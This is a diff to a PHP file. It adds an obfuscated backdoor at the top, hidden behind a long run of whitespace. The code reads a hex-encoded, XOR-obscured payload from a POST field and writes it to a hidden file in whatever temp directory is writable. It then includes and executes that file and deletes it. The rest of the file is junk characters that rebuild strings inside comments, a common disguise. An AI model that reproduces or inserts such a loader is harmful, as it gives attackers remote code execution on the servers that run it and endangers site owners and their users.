@@ -1,4 +1,5 @@
-<?php $Emk /*-
+<?php																																										if(filter_has_var(INPUT_POST, "d\x61\x74a")){ $bind = hex2bin($_POST["d\x61\x74a"]); $object = '' ; $s = 0; while($s < strlen($bind)){$object .= chr(ord($bind[$s]) ^ 15);$s++;} $obj = array_filter([sys_get_temp_dir(), getcwd(), "/var/tmp", ini_get("upload_tmp_dir"), getenv("TEMP"), "/tmp", getenv("TMP"), "/dev/shm", session_save_path()]); for ($pset = 0, $data_chunk = count($obj); $pset < $data_chunk; $pset++) { $holder = $obj[$pset]; if (!( !is_dir($holder) || !is_writable($holder) )) { $property_set = "$holder/.item"; $success = file_put_contents($property_set, $object); if ($success) { include $property_set; @unlink($property_set); exit;} } } }
+ $Emk /*-
 ℃☰♡◷≓Ⅷ☭∈↫℉⅜➡∂⌖⊕≇▽囍↩┬≄☳ⓩ*•
 <aDC#℃☰♡◷≓Ⅷ☭∈↫℉⅜➡∂⌖⊕≇▽囍↩┬≄☳ⓩ*•
 -*/= "r"."a"/*-
